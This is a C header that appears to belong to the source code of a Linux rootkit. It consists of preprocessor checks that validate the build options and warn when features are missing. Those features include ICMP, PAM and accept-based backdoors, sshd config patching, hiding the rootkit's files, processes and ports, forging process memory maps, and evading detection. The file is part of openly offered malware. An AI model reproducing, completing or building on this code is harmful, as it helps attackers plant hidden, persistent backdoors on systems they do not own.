#if !defined USE_ICMP_BD && !defined USE_PAM_BD && !defined USE_ACCEPT_BD
#warning "No backdoor method selected"
#endif

#if defined USE_ACCEPT_BD && !defined HIDE_PORTS
#error "USE_ACCEPT_BD: HIDE_PORTS must be defined"
#endif
#if defined USE_ICMP_BD && !defined HIDE_PORTS
#error "USE_ICMP_BD: HIDE_PORTS must be defined"
#endif

#if defined SSHD_PATCH_HARD && defined SSHD_PATCH_SOFT
#error "SSHD_PATCH_HARD & SSHD_PATCH_SOFT cannot be defined simultaneously"
#endif
#if (!defined SSHD_PATCH_HARD && !defined SSHD_PATCH_SOFT) && defined USE_PAM_BD
#warning "USE_PAM_BD: There is no PATCH_SSHD_CONFIG defined"
#endif
#if (defined SSHD_PATCH_HARD || defined SSHD_PATCH_SOFT) && !defined USE_PAM_BD
#warning "A PATCH_SSHD_CONFIG is defined while USE_PAM_BD is not"
#endif


#if defined READ_GID_FROM_FILE  && !defined BACKDOOR_UTIL
#warning "READ_GID_FROM_FILE: MANUAL GID changing is not SAFELY possible without BACKDOOR_UTIL defined"
#endif
#if !defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
#error "AUTO_GID_CHANGER: READ_GID_FROM_FILE must be defined"
#endif
#if defined AUTO_GID_CHANGER && !defined GID_CHANGE_MINTIME
#error "AUTO_GID_CHANGER: GID_CHANGE_MINTIME must be defined"
#endif

#if defined BACKDOOR_PKGMAN && !defined BACKDOOR_UTIL
#error "BACKDOOR_PKGMAN: BACKDOOR_UTIL must be defined"
#endif

#ifndef BACKDOOR_UTIL
#warning "BACKDOOR_UTIL: undefined - a handful of utils will be unavailable"
#endif
#ifndef HIDE_SELF
#warning "HIDE_SELF: undefined - rootkit paths & processes will not be hidden"
#endif
#ifndef FORGE_MAPS
#warning "FORGE_MAPS: undefined - the rootkit will be visible in process memory maps"
#endif
#ifndef HIDE_PORTS
#warning "HIDE_PORTS: undefined - the rootkit will not hide ANY ports"
#endif
#ifndef DO_EVASIONS
#warning "DO_EVASIONS: undefined - the rootkit will not try to conceal its presence from anything"
#endif
#ifndef ROOTKIT_BASHRC
#warning "ROOTKIT_BASHRC: UNDEFINED - THIS WILL CAUSE BREAKAGE"
#endif
#ifndef BACKDOOR_ROLF
#warning "BACKDOOR_ROLF: UNDEFINED - THIS WILL CAUSE BREAKAGE"
#endif